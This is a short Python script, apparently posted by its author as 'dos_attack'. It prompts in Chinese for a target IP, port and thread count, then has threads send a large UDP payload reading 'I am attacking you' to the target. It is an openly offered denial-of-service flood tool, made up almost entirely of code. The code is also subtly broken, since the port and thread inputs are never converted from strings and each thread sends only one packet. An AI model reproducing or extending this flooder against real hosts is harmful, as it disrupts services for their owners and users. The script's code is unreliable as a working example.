"""
Author: Rainwangpupil
Project Name: dos_attack
Data: 2022.08.20

You can use 'https://Rainwangpupil.github.io/Program/2022-08-20-dos_attack.py' to download this file
"""


import socket
import threading

ip = input('IP地址：')
port = input('端口:')
thread = input('线程数量:')

data = '我是在攻击你' * 500
data_byte = data.encode() # 生成攻击数据包
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # 生成攻击服务器

def attack():
    so.sendto(data_byte, (ip, port))

threads = [] # 保存线程
for i in range(1, thread): # 重复线程数量次
	send = threading.Thread(target=attack, args=()) # 生成多线程类
	threads.append(send) # 添加至列表

for j in threads:
    j.start() # 启动线程